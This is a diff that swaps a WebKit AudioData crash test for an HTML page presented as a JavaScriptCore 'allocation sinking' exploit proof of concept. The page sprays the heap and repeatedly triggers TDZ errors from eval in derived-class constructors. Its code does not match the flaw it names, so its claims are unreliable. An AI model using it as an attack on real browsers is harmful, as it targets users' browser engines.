@@ -1,23 +1,92 @@
 <!DOCTYPE html>
-<script>
-  window.addEventListener("load", () => {
-    window.testRunner?.dumpAsText();
+<html>
+<head>
+    <meta charset="UTF-8">
+    <title>JSC Allocation Sinking PoC</title>
+    <style>
+        #trigger {
+            margin: 20px;
+            padding: 8px;
+            font-size: 16px;
+            cursor: pointer;
+            background-color: #f44336;
+            color: white;
+            border: none;
+            border-radius: 4px;
+        }
+        #trigger:hover {
+            background-color: #d32f2f;
+        }
+    </style>
+</head>
+<body>
+    <h1>JSC Object Allocation Sinking PoC</h1>
+    <p>Click to test AvailabilityMap vulnerability</p>
+    <button id="trigger">Trigger Exploit</button>
+    <script>
+        function stressHeap() {
+            const buffers = [];
+            for (let i = 0; i < 50; i++) {
+                const buf = new Uint8Array(16 * 1024);
+                buf.fill(0x41);
+                buffers.push(buf);
+            }
+            return buffers;
+        }
 
-    // Bug 288440: assertion/crash in audioElementSpan() because copyDestination
-    // is not castable to a buffer of 16bits elements.
-    let rawData = new Uint8ClampedArray(4);
-    let audioData = new AudioData({
-      format: "s16-planar",
-      sampleRate: 1,
-      numberOfFrames: 1,
-      numberOfChannels: 2,
-      timestamp: 0,
-      data: rawData
-    });
-    let copyDestination = new Uint8ClampedArray(3);
-    audioData.copyTo(copyDestination, {planeIndex: 0});
+        function testCase(actual, expected, message) {
+            if (actual !== expected) {
+                throw `${message}. Expected '${expected}', but was '${actual}'`;
+            }
+        }
 
-    document.body.innerHTML = "PASS if no crash.";
-  });
-</script>
-<video></video>
+        function triggerExploit() {
+            const testValue = 'test-value';
+            class A {
+                constructor() {
+                    this.idValue = testValue;
+                }
+            }
+
+            class B extends A {
+                constructor(beforeSuper) {
+                    const arrow = () => eval('(() => this.idValue)()');
+                    if (beforeSuper) {
+                        const result = arrow();
+                        super();
+                        testCase(result, testValue, "TDZ error expected");
+                    } else {
+                        super();
+                        const result = arrow();
+                        testCase(result, testValue, "super() should set idValue");
+                    }
+                }
+            }
+
+            alert('Grooming heap...');
+            stressHeap();
+
+            alert('Creating B objects...');
+            for (let i = 0; i < 500; i++) {
+                new B(false);
+            }
+
+            alert('Triggering TDZ exceptions...');
+            let exceptionCount = 0;
+            for (let i = 0; i < 500; i++) {
+                try {
+                    new B(true);
+                } catch (e) {
+                    exceptionCount++;
+                    if (!(e instanceof ReferenceError)) {
+                        alert(`Unexpected error at iteration ${i}: ${e.message}`);
+                    }
+                }
+            }
+            alert(`Triggered ${exceptionCount} TDZ exceptions`);
+        }
+
+        document.getElementById('trigger').addEventListener('click', triggerExploit);
+    </script>
+</body>
+</html>
